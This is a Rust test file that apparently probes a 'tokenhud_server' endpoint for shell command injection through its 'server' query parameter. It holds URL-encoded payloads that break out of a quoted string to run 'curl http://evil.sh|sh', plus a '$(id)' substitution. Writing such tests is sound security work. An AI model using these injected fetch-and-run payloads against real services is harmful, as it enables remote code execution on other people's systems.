use std::io::{Read, Write};
use tokenhud_server::{board::App, router, store::Store};

const KEY: &str = "test-board-key-not-a-real-one";

// Multi-threaded on purpose, like every other test file here. The blocking
// reads below park the thread they run on, and on the default current-thread
// runtime that is the only thread there is, so the server task they are waiting
// for never gets a chance to run and the test hangs forever rather than failing.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn install_script_server_param_is_raw() {
    let dir = std::env::temp_dir().join(format!("thud-inj-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir).unwrap();
    let store = Store::open(&dir.join("t.db"), 30).unwrap();
    let app = App::new(store, KEY.into(), false, 8, true, String::new());
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = listener.local_addr().unwrap().port();
    let r = router(app.clone());
    tokio::spawn(async move { let _ = axum::serve(listener, r).await; });

    // %22 -> " ; %3B -> ; ; %20 -> space ; %7C -> |
    let path = "/api/v1/install-script?server=http%3A%2F%2Fx%22%3Bcurl%20http%3A%2F%2Fevil.sh%7Csh%3B%22";
    let req = format!("GET {path} HTTP/1.1\r\nHost: x\r\nConnection: close\r\nX-TokenHUD-Key: {KEY}\r\n\r\n");
    let mut s = std::net::TcpStream::connect(("127.0.0.1", port)).unwrap();
    s.set_read_timeout(Some(std::time::Duration::from_secs(10))).unwrap();
    s.write_all(req.as_bytes()).unwrap();
    let mut out = Vec::new();
    let _ = s.read_to_end(&mut out);
    let text = String::from_utf8_lossy(&out).to_string();
    for line in text.lines() {
        if line.contains("TOKENHUD_SERVER") || line.contains("Reporting to") || line.starts_with("HTTP/") {
            eprintln!("LINE: {line}");
        }
    }
    // also try a $() form which needs no quote break at all
    let path2 = "/api/v1/upgrade-script?server=http%3A%2F%2Fx%24(id)";
    let req2 = format!("GET {path2} HTTP/1.1\r\nHost: x\r\nConnection: close\r\nX-TokenHUD-Key: {KEY}\r\n\r\n");
    let mut s2 = std::net::TcpStream::connect(("127.0.0.1", port)).unwrap();
    s2.set_read_timeout(Some(std::time::Duration::from_secs(10))).unwrap();
    s2.write_all(req2.as_bytes()).unwrap();
    let mut out2 = Vec::new();
    let _ = s2.read_to_end(&mut out2);
    let text2 = String::from_utf8_lossy(&out2).to_string();
    for line in text2.lines() {
        if line.contains("TOKENHUD_SERVER") || line.contains("TOKENHUD_KEY") || line.starts_with("HTTP/") {
            eprintln!("UPG: {line}");
        }
    }
}
